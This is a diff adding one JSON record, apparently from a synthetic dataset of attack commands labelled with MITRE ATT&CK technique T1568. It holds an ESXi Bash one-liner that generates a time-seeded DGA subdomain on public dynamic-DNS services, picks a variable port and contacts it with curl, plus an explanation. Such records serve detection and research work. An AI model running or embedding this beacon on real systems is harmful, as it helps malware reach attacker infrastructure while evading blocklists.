@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "seed=\"$(date -u +%Y%m%d%H%M%S)\"; sub=$(echo -n \"$seed\" | sha256sum | cut -c1-15); tld=$(printf \"ddns.net\\ndynu.net\\nduckdns.org\\nno-ip.org\" | awk \"NR==$(($(date -u +%S)%4+1))\"); dom=\"$sub.$tld\"; port=$(( 2000 + ($(date -u +%s) % 45000) )); curl --max-time 5 --connect-timeout 5 \"https://$dom:$port/v1/check\"",
+  "explanation": "Produces a per-second DGA subdomain and selects a provider TLD by current seconds, with a wide dynamic port range. This is dynamic resolution in line with T1568.",
+  "rationale_steps": [
+    "Use current UTC timestamp to seed a DGA hash.",
+    "Choose a provider TLD based on the current second.",
+    "Compute a variable port from epoch seconds.",
+    "Attempt a curl request to the dynamic endpoint."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-40e050dc",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
